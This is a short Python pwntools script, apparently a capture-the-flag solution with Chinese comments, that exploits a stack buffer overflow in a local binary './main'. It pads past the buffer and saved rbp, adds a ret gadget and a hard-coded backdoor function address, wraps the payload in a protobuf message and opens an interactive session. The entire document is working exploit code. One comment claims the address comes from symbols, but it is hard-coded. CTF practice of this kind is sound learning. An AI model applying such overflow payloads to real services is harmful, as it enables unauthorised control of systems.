from pwn import *
import magic_pb2

context.log_level = 'debug'
context.binary = "./main"
p = process("./main")
elf = ELF("./main")

# 获取正确的backdoor地址
backdoor = 0x00000000040131B  # 使用symbols获取真实地址
ret = 0x000000000040101a 

# 构造payload
payload = b'A' * (0x50+8)           # 缓冲区 + 保存的rbp
payload += p64(ret) + p64(backdoor)  # ret + backdoor地址

# 构造protobuf消息
message = magic_pb2.Message()
message.magic_type = "payload"
message.magic_content = payload
message.spell_size = len(payload)

# 发送payload
p.sendafter(b"Protobuf?\n", message.SerializeToString())
p.interactive()
